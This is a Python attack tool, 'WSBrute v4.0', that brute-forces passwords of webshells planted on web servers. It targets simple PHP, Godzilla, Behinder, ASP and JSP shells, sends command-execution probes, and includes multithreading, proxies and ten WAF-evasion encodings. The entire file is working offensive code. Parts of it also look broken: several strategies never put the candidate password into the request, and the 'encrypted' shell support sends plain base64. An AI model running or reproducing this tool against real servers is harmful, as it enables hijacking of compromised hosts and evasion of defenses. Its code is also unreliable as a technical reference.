#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
WSBrute v4.0 - Advanced WebShell Brute Force Tool
Support for encrypted WebShells (Godzilla, Behinder) and WAF bypass
"""

__version__ = "4.0"

import argparse
import base64
import hashlib
import json
import logging
import os
import random
import re
import queue
import threading
import time
import sys
from datetime import datetime
from typing import Dict, List, Optional, Generator, Any, Tuple

import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

# 配置日志
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.StreamHandler(sys.stdout)
    ]
)
logger = logging.getLogger(__name__)

# 常量定义
LENGTH_DEVIATION_THRESHOLD = 1.5
BASELINE_DUMMY_PASSWORD = "__wrong_baseline_test__"

# 颜色输出
class Colors:
    HEADER = "\033[95m"
    OKBLUE = "\033[94m"
    OKGREEN = "\033[92m"
    WARNING = "\033[93m"
    FAIL = "\033[91m"
    ENDC = "\033[0m"
    BOLD = "\033[1m"
    UNDERLINE = "\033[4m"

# 策略模式基类
class ShellStrategy:
    """WebShell策略基类"""

    @property
    def name(self) -> str:
        return self.__class__.__name__

    @property
    def supports_bypass(self) -> bool:
        """是否支持WAF绕过"""
        return True

    def __init__(self, success_marker=None, success_regex=None, param_name=None):
        self.success_marker = success_marker or "_brute_test_force_"
        self.success_regex = success_regex
        self.param_name = param_name or "password"

    def detect(self, response: requests.Response) -> bool:
        """检测是否匹配此策略"""
        return False

    def build_request(self, password: str) -> Dict[str, Any]:
        """构建请求数据"""
        return {}

    def is_success(self, response: requests.Response, baseline_length=0, baseline_hash=None) -> bool:
        """判断是否成功 - 包含基线对比"""
        content = response.text

        if self.success_regex:
            if re.search(self.success_regex, content):
                return True

        if self.success_marker:
            if self.success_marker in content:
                return True
            try:
                decoded = base64.b64decode(content, validate=True).decode(errors='ignore')
                if self.success_marker in decoded:
                    return True
            except:
                pass

        if baseline_length > 0:
            response_length = len(content)
            if response_length > baseline_length * LENGTH_DEVIATION_THRESHOLD:
                return True
            if baseline_hash:
                current_hash = hashlib.md5(content.encode()).hexdigest()
                if current_hash != baseline_hash:
                    return True

        return False

# 简单PHP WebShell策略
class PHPSimpleStrategy(ShellStrategy):
    def __init__(self, success_marker=None, success_regex=None, param_name=None):
        super().__init__(success_marker, success_regex, param_name)

    def detect(self, response: requests.Response) -> bool:
        return True

    def build_request(self, password: str) -> Dict[str, Any]:
        return {
            "method": "POST",
            "data": {
                self.param_name: f'echo "{self.success_marker}";'
            }
        }

# 哥斯拉WebShell策略
class GodzillaStrategy(ShellStrategy):
    @property
    def supports_bypass(self) -> bool:
        return False

    def __init__(self, success_marker=None, success_regex=None, param_name=None):
        super().__init__(success_marker, success_regex, param_name)

    def detect(self, response: requests.Response) -> bool:
        content = response.text
        text = content.strip()
        try:
            decoded = base64.b64decode(text, validate=True)
            if len(decoded) > 0 and len(decoded) < len(text) * 0.7:
                return True
        except:
            pass
        if len(content) < 200:
            return True
        return False

    def build_request(self, password: str) -> Dict[str, Any]:
        cmd = f'echo "{self.success_marker}";'
        encoded_cmd = base64.b64encode(cmd.encode()).decode()
        return {
            "method": "POST",
            "data": {
                self.param_name: password,
                "z0": encoded_cmd
            },
            "headers": {
                "Content-Type": "application/x-www-form-urlencoded"
            }
        }

# 冰蝎WebShell策略
class BehinderStrategy(ShellStrategy):
    @property
    def supports_bypass(self) -> bool:
        return False

    def __init__(self, success_marker=None, success_regex=None, param_name=None, second_param_name="data"):
        super().__init__(success_marker, success_regex, param_name)
        self.second_param_name = second_param_name

    def detect(self, response: requests.Response) -> bool:
        content = response.text
        text = content.strip()
        try:
            decoded = base64.b64decode(text, validate=True)
            if len(decoded) > 0 and len(decoded) < len(text) * 0.7:
                return True
        except:
            pass
        if len(content) < 200:
            return True
        return False

    def build_request(self, password: str) -> Dict[str, Any]:
        cmd = f'echo "{self.success_marker}";'
        encoded_cmd = base64.b64encode(cmd.encode()).decode()
        return {
            "method": "POST",
            "data": {
                self.param_name: password,
                self.second_param_name: encoded_cmd
            },
            "headers": {
                "Content-Type": "application/x-www-form-urlencoded"
            }
        }

# ASP/ASPX WebShell策略
class ASPASPXStrategy(ShellStrategy):
    def __init__(self, success_marker=None, success_regex=None, param_name=None):
        super().__init__(success_marker, success_regex, param_name)

    def detect(self, response: requests.Response) -> bool:
        content = response.text
        return "Response.Write" in content or "Server.CreateObject" in content

    def build_request(self, password: str) -> Dict[str, Any]:
        return {
            "method": "POST",
            "data": {
                self.param_name: f'Response.Write("{self.success_marker}")'
            }
        }

# JSP WebShell策略
class JSPStrategy(ShellStrategy):
    def __init__(self, success_marker=None, success_regex=None, param_name=None):
        super().__init__(success_marker, success_regex, param_name)

    def detect(self, response: requests.Response) -> bool:
        content = response.text
        return "out.print" in content or "request.getParameter" in content

    def build_request(self, password: str) -> Dict[str, Any]:
        return {
            "method": "POST",
            "data": {
                self.param_name: f'out.print("{self.success_marker}");'
            }
        }

# WAF绕过类
class WAFBypass:
    """WAF绕过工具类"""

    def __init__(self):
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
        ]

    def get_random_user_agent(self) -> str:
        return random.choice(self.user_agents)

    def get_bypass_method(self, method: int):
        """获取绕过方法"""
        methods = {
            1: lambda x: x,
            2: lambda x: self.url_encode(x),
            3: lambda x: self.double_url_encode(x),
            4: lambda x: base64.b64encode(x.encode()).decode(),
            5: lambda x: self.hex_encode(x),
            6: lambda x: self.unicode_encode(x),
            7: lambda x: self.random_case(x),
            8: lambda x: self.insert_comments(x),
            9: lambda x: self.insert_whitespace(x),
            10: lambda x: self.add_special_chars(x)
        }
        return methods.get(method, lambda x: x)

    def url_encode(self, s: str) -> str:
        return "".join(["%{:02X}".format(ord(c)) for c in s])

    def double_url_encode(self, s: str) -> str:
        return self.url_encode(self.url_encode(s))

    def hex_encode(self, s: str) -> str:
        return "0x" + s.encode().hex()

    def unicode_encode(self, s: str) -> str:
        return "".join(["\\u{:04x}".format(ord(c)) for c in s])

    def random_case(self, s: str) -> str:
        return "".join([random.choice([c.upper(), c.lower()]) for c in s])

    def insert_comments(self, s: str) -> str:
        if len(s) < 4:
            return s
        if ' ' in s:
            parts = s.split(' ', 1)
            return parts[0] + "/*comment*/" + parts[1] if len(parts) > 1 else s
        return s

    def insert_whitespace(self, s: str) -> str:
        return " ".join(s)

    def add_special_chars(self, s: str) -> str:
        return s + "/*" + "".join([random.choice("!@#$%^&*()") for _ in range(3)]) + "*/"

# 令牌桶速率限制器
class TokenBucket:
    """令牌桶速率限制器"""

    def __init__(self, rate, capacity, stop_event=None):
        self.rate = rate
        self.capacity = capacity
        self.tokens = capacity
        self.last_fill_time = time.time()
        self.lock = threading.Lock()
        self.stop_event = stop_event or threading.Event()

    def _refill(self):
        """补充令牌"""
        now = time.time()
        elapsed = now - self.last_fill_time
        new_tokens = elapsed * self.rate
        if new_tokens > 0:
            self.tokens = min(self.capacity, self.tokens + new_tokens)
            self.last_fill_time = now

    def consume(self, tokens=1):
        """消耗令牌"""
        while True:
            if self.stop_event.is_set():
                return False
            with self.lock:
                self._refill()
                if self.tokens >= tokens:
                    self.tokens -= tokens
                    return True
                else:
                    wait_time = (tokens - self.tokens) / self.rate
            time.sleep(min(wait_time, 0.1))

# 主要的暴力破解类
class BruteForce:
    """WebShell暴力破解类"""

    def __init__(self, url, password_file, threads=10, delay=0, waf_bypass=1, success_marker=None, success_regex=None,
                 timeout=30, ssl_verify=True, qps=0, param_name=None, second_param_name=None,
                 proxy=None, shell_type=None, debug=False, retry=3, output=None,
                 cookie=None, headers=None):
        self.url = self._ensure_url_schema(url)
        self.password_file = password_file
        self.threads = threads
        self.delay = delay
        self.waf_bypass = waf_bypass
        self.success_marker = success_marker or "_brute_test_force_"
        self.success_regex = success_regex
        self.timeout = timeout
        self.ssl_verify = ssl_verify
        self.qps = qps
        self.param_name = param_name or "password"
        self.second_param_name = second_param_name or "data"
        self.proxy = proxy
        self.shell_type = shell_type
        self.debug = debug
        self.retry = retry
        self.output = output
        self.cookie = cookie
        self.headers = headers or {}

        self.stop_event = threading.Event()
        self.found_password = None
        self.total_passwords = 0
        self.checked_passwords = 0
        self.start_time = None
        self.waf_bypass_tool = WAFBypass()
        self.strategy = None
        self.session = None
        self.token_bucket = TokenBucket(qps, qps * 2, self.stop_event) if qps > 0 else None

        self.lock = threading.Lock()
        self.current_line = 0
        self.start_line = 0
        self.baseline_length = 0
        self.baseline_status = 200
        self.baseline_hash = ""

    def _establish_baseline(self):
        """建立错误密码的响应基线"""
        try:
            headers = {"User-Agent": self.waf_bypass_tool.get_random_user_agent()}
            resp = self.session.post(
                self.url,
                data={},
                headers=headers,
                timeout=self.timeout,
                verify=self.ssl_verify
            )
            self.baseline_length = len(resp.text)
            self.baseline_status = resp.status_code
            self.baseline_hash = hashlib.md5(resp.text.encode()).hexdigest()
            logger.debug(f"Baseline established: length={self.baseline_length}, status={self.baseline_status}")
        except Exception as e:
            logger.debug(f"Failed to establish baseline: {e}")
            self.baseline_length = 0
            self.baseline_status = None

    def _detect_encrypted_response(self, response: requests.Response) -> bool:
        """检测响应是否像密文"""
        text = response.text.strip()
        try:
            decoded = base64.b64decode(text, validate=True)
            if len(decoded) > 0:
                return True
        except:
            pass
        if len(text) < 200 and '\x00' in text:
            return True
        return False

    def _ensure_url_schema(self, url):
        """确保URL有正确的schema"""
        if not url.startswith("http://") and not url.startswith("https://"):
            return "http://" + url
        return url

    def _create_session(self):
        """创建请求会话"""
        session = requests.Session()
        retries = Retry(total=self.retry, backoff_factor=1, status_forcelist=[500, 502, 503, 504])
        adapter = HTTPAdapter(max_retries=retries)
        session.mount("http://", adapter)
        session.mount("https://", adapter)

        if self.proxy:
            session.proxies = {
                "http": self.proxy,
                "https": self.proxy
            }

        if self.cookie:
            for cookie_part in self.cookie.split(';'):
                cookie_part = cookie_part.strip()
                if '=' in cookie_part:
                    name, value = cookie_part.split('=', 1)
                    session.cookies.set(name.strip(), value.strip())

        if self.headers:
            for header in self.headers:
                if ':' in header:
                    key, value = header.split(':', 1)
                    session.headers[key.strip()] = value.strip()

        return session

    def _count_lines(self, file_path):
        """计算文件行数"""
        try:
            with open(file_path, "rb") as f:
                return sum(1 for _ in f)
        except Exception as e:
            logger.error(f"Error counting lines: {e}")
            return 0

    def _password_generator(self, start_line=0):
        """密码生成器 - 支持多种编码"""
        encodings = ['utf-8', 'latin-1', 'gbk', 'gb2312', 'big5']
        for enc in encodings:
            try:
                with open(self.password_file, 'r', encoding=enc, errors='strict') as f:
                    for i, line in enumerate(f, 1):
                        if i <= start_line:
                            continue
                        password = line.strip()
                        if password:
                            yield (i, password)
                break
            except UnicodeDecodeError:
                logger.debug(f"Encoding {enc} failed, trying next...")
                continue
            except Exception as e:
                logger.error(f"Error reading password file: {e}")
                break

    def _create_strategy(self, shell_type=None):
        """根据类型创建策略"""
        if shell_type:
            shell_type = shell_type.lower()
            if shell_type in ["php", "simple"]:
                return PHPSimpleStrategy(self.success_marker, self.success_regex, self.param_name)
            elif shell_type in ["godzilla", "god"]:
                return GodzillaStrategy(self.success_marker, self.success_regex, self.param_name)
            elif shell_type in ["behinder", "beh"]:
                return BehinderStrategy(self.success_marker, self.success_regex, self.param_name, self.second_param_name)
            elif shell_type in ["asp", "aspx"]:
                return ASPASPXStrategy(self.success_marker, self.success_regex, self.param_name)
            elif shell_type in ["jsp", "jspx"]:
                return JSPStrategy(self.success_marker, self.success_regex, self.param_name)

        return PHPSimpleStrategy(self.success_marker, self.success_regex, self.param_name)

    def _select_strategy(self):
        """选择合适的WebShell策略"""
        if self.shell_type:
            logger.info(f"Using specified shell type: {self.shell_type}")
            self.strategy = self._create_strategy(self.shell_type)
            return self.strategy

        strategies = [
            ("PHP", PHPSimpleStrategy(self.success_marker, self.success_regex, self.param_name)),
            ("Godzilla", GodzillaStrategy(self.success_marker, self.success_regex, self.param_name)),
            ("Behinder", BehinderStrategy(self.success_marker, self.success_regex, self.param_name, self.second_param_name))
        ]

        test_password = "test_detect_123"
        baseline_response = None

        try:
            headers = {"User-Agent": self.waf_bypass_tool.get_random_user_agent()}
            baseline_response = self.session.post(
                self.url,
                data={},
                headers=headers,
                timeout=5,
                verify=self.ssl_verify
            )
        except:
            pass

        for name, strategy in strategies:
            try:
                request_data = strategy.build_request(test_password)
                if not request_data:
                    continue

                method = request_data.get("method", "POST")
                data = request_data.get("data", {})
                headers = request_data.get("headers", {})
                headers["User-Agent"] = self.waf_bypass_tool.get_random_user_agent()

                try:
                    if method == "POST":
                        test_response = self.session.post(
                            self.url,
                            data=data,
                            headers=headers,
                            timeout=5,
                            verify=self.ssl_verify
                        )
                    else:
                        test_response = self.session.get(
                            self.url,
                            params=data,
                            headers=headers,
                            timeout=5,
                            verify=self.ssl_verify
                        )

                    if test_response.status_code not in [404, 500]:
                        if baseline_response:
                            length_diff = abs(len(test_response.text) - len(baseline_response.text))
                            if length_diff > 50 or test_response.status_code != baseline_response.status_code:
                                logger.info(f"Detected WebShell type: {name}")
                                self.strategy = strategy
                                return strategy

                        if strategy.detect(test_response):
                            logger.info(f"Detected WebShell type: {name}")
                            self.strategy = strategy
                            return strategy
                except requests.exceptions.RequestException as e:
                    if self.debug:
                        logger.debug(f"Strategy {name} test failed: {e}")
                    continue

            except Exception as e:
                if self.debug:
                    logger.debug(f"Strategy {name} error: {e}")
                continue

        logger.warning("Could not detect shell type, using PHP simple strategy")
        self.strategy = PHPSimpleStrategy(self.success_marker, self.success_regex, self.param_name)
        return self.strategy

    def _apply_waf_bypass(self, data):
        """应用WAF绕过"""
        bypass_method = self.waf_bypass_tool.get_bypass_method(self.waf_bypass)
        if isinstance(data, dict):
            bypassed_data = {}
            for key, value in data.items():
                bypassed_data[key] = bypass_method(value)
            return bypassed_data
        return data

    def _try_password(self, line_num, password):
        """尝试单个密码"""
        if self.stop_event.is_set():
            return False

        try:
            if self.token_bucket:
                if not self.token_bucket.consume():
                    return False

            request_data = self.strategy.build_request(password)
            if not request_data:
                return False

            method = request_data.get("method", "POST")
            data = request_data.get("data", {})
            headers = request_data.get("headers", {})

            if self.strategy.supports_bypass and self.waf_bypass > 1:
                data = self._apply_waf_bypass(data)

            headers["User-Agent"] = self.waf_bypass_tool.get_random_user_agent()

            if method == "POST":
                response = self.session.post(
                    self.url,
                    data=data,
                    headers=headers,
                    timeout=self.timeout,
                    verify=self.ssl_verify
                )
            else:
                response = self.session.get(
                    self.url,
                    params=data,
                    headers=headers,
                    timeout=self.timeout,
                    verify=self.ssl_verify
                )

            if response.status_code in (404, 403, 401, 400, 500):
                if self.baseline_status and response.status_code != self.baseline_status:
                    if self.strategy.is_success(response, self.baseline_length, self.baseline_hash):
                        self.found_password = password
                        self.stop_event.set()
                        return True
                return False

            if self.strategy.is_success(response, self.baseline_length, self.baseline_hash):
                self.found_password = password
                self.stop_event.set()
                return True

            if self.delay > 0:
                time.sleep(self.delay)

        except requests.exceptions.Timeout:
            if self.debug:
                logger.debug(f"Timeout on password attempt: {password}")
        except requests.exceptions.ConnectionError as e:
            if self.debug:
                logger.debug(f"Connection error: {e}")
        except requests.exceptions.RequestException as e:
            if self.debug:
                logger.debug(f"Request error: {e}")
        except Exception as e:
            if self.debug:
                logger.debug(f"Unexpected error: {e}")

        return False

    def _producer(self, password_queue, start_line):
        """生产者线程：流式读取密码"""
        try:
            for line_num, password in self._password_generator(start_line):
                if self.stop_event.is_set():
                    break
                password_queue.put((line_num, password))
            for _ in range(self.threads):
                password_queue.put((None, None))
        except Exception as e:
            logger.error(f"Producer error: {e}")

    def _worker(self, password_queue):
        """工作线程"""
        while not self.stop_event.is_set():
            try:
                line_num, password = password_queue.get(timeout=0.5)
            except queue.Empty:
                continue

            if password is None:
                break

            if self._try_password(line_num, password):
                self.stop_event.set()

            with self.lock:
                self.checked_passwords += 1
                self.current_line = line_num
                if self.checked_passwords % 100 == 0:
                    self._save_resume_data(line_num)

            password_queue.task_done()

    def _print_status(self):
        """打印状态"""
        if self.total_passwords > 0 and self.start_time:
            progress = (self.checked_passwords / self.total_passwords) * 100
            elapsed = time.time() - self.start_time
            speed = self.checked_passwords / elapsed if elapsed > 0 else 0
            print(f"{Colors.OKBLUE}[Progress] {self.checked_passwords}/{self.total_passwords} ({progress:.2f}%) - {speed:.2f} p/s{Colors.ENDC}", end="\r")

    def _progress_reporter(self, stop_event):
        """独立的进度报告线程"""
        while not stop_event.wait(0.5):
            with self.lock:
                if self.total_passwords > 0 and self.start_time:
                    remaining = self.total_passwords - self.start_line
                    actual_progress = self.checked_passwords
                    remaining_to_check = max(0, remaining - actual_progress)
                    progress = (actual_progress / remaining) * 100 if remaining > 0 else 0
                    elapsed = time.time() - self.start_time
                    speed = actual_progress / elapsed if elapsed > 0 else 0
                    print(f"{Colors.OKBLUE}[Progress] {actual_progress}/{remaining} ({progress:.2f}%) - {remaining_to_check} left - {speed:.2f} p/s{Colors.ENDC}", end="\r")
        print()

    def _get_resume_file(self):
        """生成恢复文件名（包含URL哈希）"""
        url_hash = hashlib.md5(self.url.encode()).hexdigest()[:8]
        return f"{os.path.basename(self.password_file)}_{url_hash}.resume"

    def _load_resume_data(self):
        """加载恢复数据"""
        resume_file = self._get_resume_file()
        if os.path.exists(resume_file):
            try:
                with open(resume_file, "r") as f:
                    resume_data = json.load(f)
                    if resume_data.get("url") == self.url:
                        return resume_data.get("line", 0)
            except Exception as e:
                logger.warning(f"Error loading resume data: {e}")
        return 0

    def _save_resume_data(self, line):
        """保存恢复数据"""
        resume_file = self._get_resume_file()
        try:
            with open(resume_file, "w") as f:
                json.dump({
                    "line": line,
                    "url": self.url,
                    "timestamp": datetime.now().isoformat()
                }, f)
        except Exception as e:
            logger.warning(f"Error saving resume data: {e}")

    def _save_result(self, password, elapsed):
        """保存结果到文件"""
        if not self.output:
            return

        try:
            with open(self.output, "w") as f:
                if password:
                    f.write(f"Password found: {password}\n")
                    f.write(f"Target: {self.url}\n")
                    f.write(f"Shell type: {self.strategy.name}\n")
                    f.write(f"Time elapsed: {elapsed:.2f} seconds\n")
                else:
                    f.write(f"No password found\n")
                    f.write(f"Target: {self.url}\n")
                    f.write(f"Time elapsed: {elapsed:.2f} seconds\n")
                f.write(f"Timestamp: {datetime.now().isoformat()}\n")
            logger.info(f"Result saved to {self.output}")
        except Exception as e:
            logger.error(f"Error saving result: {e}")

    def run(self):
        """运行暴力破解"""
        print(f"{Colors.HEADER}WSBrute v4.0 - WebShell Brute Force Tool{Colors.ENDC}")
        print(f"{Colors.OKBLUE}Target: {self.url}{Colors.ENDC}")
        print(f"{Colors.OKBLUE}Password file: {self.password_file}{Colors.ENDC}")
        print(f"{Colors.OKBLUE}Threads: {self.threads}{Colors.ENDC}")
        print(f"{Colors.OKBLUE}Delay: {self.delay}s{Colors.ENDC}")
        print(f"{Colors.OKBLUE}WAF bypass: {self.waf_bypass}{Colors.ENDC}")
        print(f"{Colors.OKBLUE}Timeout: {self.timeout}s{Colors.ENDC}")
        print(f"{Colors.OKBLUE}SSL verify: {self.ssl_verify}{Colors.ENDC}")
        if self.qps > 0:
            print(f"{Colors.OKBLUE}QPS limit: {self.qps}{Colors.ENDC}")
        if self.param_name:
            print(f"{Colors.OKBLUE}Param name: {self.param_name}{Colors.ENDC}")
        if self.proxy:
            print(f"{Colors.OKBLUE}Proxy: {self.proxy}{Colors.ENDC}")
        if self.cookie:
            print(f"{Colors.OKBLUE}Cookie: {self.cookie}{Colors.ENDC}")
        if self.headers:
            print(f"{Colors.OKBLUE}Headers: {self.headers}{Colors.ENDC}")
        if self.shell_type:
            print(f"{Colors.OKBLUE}Shell type: {self.shell_type}{Colors.ENDC}")

        self.session = self._create_session()

        self._select_strategy()

        self._establish_baseline()

        self.total_passwords = self._count_lines(self.password_file)
        print(f"{Colors.OKBLUE}Total passwords: {self.total_passwords}{Colors.ENDC}")

        self.start_line = self._load_resume_data()
        if self.start_line > 0:
            print(f"{Colors.WARNING}Resuming from line {self.start_line}{Colors.ENDC}")

        password_queue = queue.Queue(maxsize=self.threads * 10)

        producer_thread = threading.Thread(
            target=self._producer,
            args=(password_queue, self.start_line)
        )
        producer_thread.daemon = True
        producer_thread.start()

        progress_thread = threading.Thread(target=self._progress_reporter, args=(self.stop_event,))
        progress_thread.daemon = True
        progress_thread.start()

        self.start_time = time.time()

        threads = []
        for _ in range(self.threads):
            t = threading.Thread(target=self._worker, args=(password_queue,))
            t.daemon = True
            t.start()
            threads.append(t)

        try:
            for t in threads:
                t.join()
        except KeyboardInterrupt:
            print(f"\n{Colors.WARNING}Interrupted by user. Progress saved.{Colors.ENDC}")
            self._save_resume_data(self.current_line)
            return None

        resume_file = self._get_resume_file()
        if os.path.exists(resume_file):
            os.remove(resume_file)

        elapsed = time.time() - self.start_time
        if self.found_password:
            print(f"\n{Colors.OKGREEN}✓ Password found: {self.found_password}{Colors.ENDC}")
            print(f"{Colors.OKGREEN}Time elapsed: {elapsed:.2f} seconds{Colors.ENDC}")
            self._save_result(self.found_password, elapsed)
            return self.found_password
        else:
            print(f"\n{Colors.FAIL}✗ No password found{Colors.ENDC}")
            print(f"{Colors.FAIL}Time elapsed: {elapsed:.2f} seconds{Colors.ENDC}")
            self._save_result(None, elapsed)
            return None

# 主函数
def main():
    """主函数"""
    parser = argparse.ArgumentParser(
        description="WSBrute v4.0 - Advanced WebShell Brute Force Tool",
        formatter_class=argparse.RawDescriptionHelpFormatter
    )

    parser.add_argument("-u", "--url", required=True, help="Target WebShell URL")
    parser.add_argument("-p", "--password-file", default="ShellPwd.txt",
                        help="Password dictionary file (default: ShellPwd.txt)")
    parser.add_argument("-t", "--threads", type=int, default=10,
                        help="Number of threads (default: 10)")
    parser.add_argument("-d", "--delay", type=float, default=0,
                        help="Delay between requests in seconds (default: 0)")
    parser.add_argument("--waf-bypass", type=int, default=1,
                        help="WAF bypass method (1-10, default: 1)")
    parser.add_argument("--shell-type",
                        choices=["php", "godzilla", "behinder", "asp", "jsp"],
                        help="Manually specify shell type")
    parser.add_argument("--param-name", default="password",
                        help="Password parameter name in POST data (default: password)")
    parser.add_argument("--second-param",
                        help="Second parameter name for encrypted shells (e.g., data, z1)")
    parser.add_argument("--success-string",
                        help="Custom success marker string")
    parser.add_argument("--success-regex",
                        help="Custom success regex pattern")
    parser.add_argument("--timeout", type=int, default=30,
                        help="Request timeout in seconds (default: 30)")
    parser.add_argument("--no-ssl-verify", action="store_true",
                        help="Disable SSL verification")
    parser.add_argument("--qps", type=int, default=0,
                        help="Queries per second limit (default: 0, no limit)")
    parser.add_argument("--proxy",
                        help="Proxy server (e.g., http://127.0.0.1:8080)")
    parser.add_argument("--cookie",
                        help="Cookie header for authenticated requests")
    parser.add_argument("-H", "--header", action="append", dest="headers", default=[],
                        help="Custom HTTP header (can be used multiple times, e.g., -H 'Authorization: Bearer xxx')")
    parser.add_argument("--retry", type=int, default=3,
                        help="Number of retry attempts on failure (default: 3)")
    parser.add_argument("--output",
                        help="Output file to save results")
    parser.add_argument("--debug", action="store_true",
                        help="Enable debug logging")

    args = parser.parse_args()

    if not os.path.exists(args.password_file):
        print(f"{Colors.FAIL}Password file not found: {args.password_file}{Colors.ENDC}")
        return

    brute_force = BruteForce(
        url=args.url,
        password_file=args.password_file,
        threads=args.threads,
        delay=args.delay,
        waf_bypass=args.waf_bypass,
        success_marker=args.success_string,
        success_regex=args.success_regex,
        timeout=args.timeout,
        ssl_verify=not args.no_ssl_verify,
        qps=args.qps,
        param_name=args.param_name,
        second_param_name=args.second_param,
        proxy=args.proxy,
        shell_type=args.shell_type,
        debug=args.debug,
        retry=args.retry,
        output=args.output,
        cookie=args.cookie,
        headers=args.headers
    )

    brute_force.run()

if __name__ == "__main__":
    main()
